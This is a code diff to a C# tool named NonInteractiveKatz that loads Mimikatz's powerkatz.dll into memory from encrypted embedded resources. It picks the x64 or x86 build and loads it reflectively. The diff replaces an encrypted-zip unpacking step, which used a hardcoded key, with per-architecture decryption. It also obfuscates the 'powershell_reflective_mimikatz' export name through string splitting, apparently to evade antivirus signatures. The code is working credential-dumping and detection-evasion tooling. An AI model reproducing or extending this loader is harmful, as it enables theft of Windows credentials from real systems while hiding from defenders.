@@ -14,16 +14,6 @@ namespace NonInteractiveKatz
 {
     public class NonInteractiveKatz
     {
-        public static void Main()
-        {
-            //KatzAssembly.Program.Main(); //- создаст b64 из архива mimikatz
-
-            Console.WriteLine(NonInteractiveKatz.Coffee());
-            //Console.WriteLine(NonInteractiveKatz.LogonPasswords());
-            //KatzAssembly.Katz.Exec(false);
-            //Console.ReadLine();
-        }
-
         private static byte[] PEBytes32 { get; set; }
         private static byte[] PEBytes64 { get; set; }
 
@@ -41,37 +31,21 @@ namespace NonInteractiveKatz
             // Console.WriteLine(String.Join(",", System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames()));
             if (MimikatzPE == null)
             {
-                byte[] LatestMimikatzArchive;
-
-                string resource_data = System.Text.Encoding.Default.GetString(NonInteractiveMimikatz.Properties.Resources.mimikatz_trunk_zip_enc);
-                LatestMimikatzArchive = Utilities.Decrypt(Convert.FromBase64String(resource_data), "[!~=passw0rd=~!]");
-                Stream data = new MemoryStream(LatestMimikatzArchive); //The original data
-                Stream unzippedEntryStream;  //Unzipped data from a file in the archive
-                ZipArchive archive = new ZipArchive(data);
-
-                Console.WriteLine("archive unpacked");
-
-                foreach (ZipArchiveEntry entry in archive.Entries)
+                if (IntPtr.Size == 8 ) //x64 Unpack And Execute
                 {
-                    Console.WriteLine(entry.FullName);
-                    if (IntPtr.Size == 8 && entry.FullName == @"x64/powerkatz.dll") //x64 Unpack And Execute
-                    {
-                        //x64 Unpack And Execute
-                        Console.WriteLine(entry.FullName + " !! Gocha");
-                        unzippedEntryStream = entry.Open(); // .Open will return a stream
-                        PEBytes64 = Utilities.ReadFully(unzippedEntryStream);
-                        MimikatzPE = PE.Load(PEBytes64);
-                    }
-                    else if (IntPtr.Size == 4 && entry.FullName == @"Win32/powerkatz.dll")
-                    {
-                        //x86 Unpack And Execute
-                        Console.WriteLine(entry.FullName + " !! Gocha");
-                        unzippedEntryStream = entry.Open(); // .Open will return a stream
-                        PEBytes32 = Utilities.ReadFully(unzippedEntryStream);
-                        MimikatzPE = PE.Load(PEBytes32);
-                    }
+                    //x64 Unpack And Execute
+                    Console.WriteLine("x64 !! Gocha");
+                    PEBytes64 = Utilities.Decrypt(NonInteractiveMimikatz.Properties.Resources.x64powerkatz);
+                    MimikatzPE = PE.Load(PEBytes64);
                 }
-
+                else if (IntPtr.Size == 4)
+                {
+                    //x86 Unpack And Execute
+                    Console.WriteLine("x86 !! Gocha");
+                    PEBytes32 = Utilities.Decrypt(NonInteractiveMimikatz.Properties.Resources.Win32powerkatz);
+                    MimikatzPE = PE.Load(PEBytes32);
+                }
+                
             }
             if (MimikatzPE == null) { return ""; }
             IntPtr functionPointer = MimikatzPE.GetFunctionExport("pAAAowershell_".Replace("AAA","") + " reflective_".TrimStart() +" mimikatz".Trim());
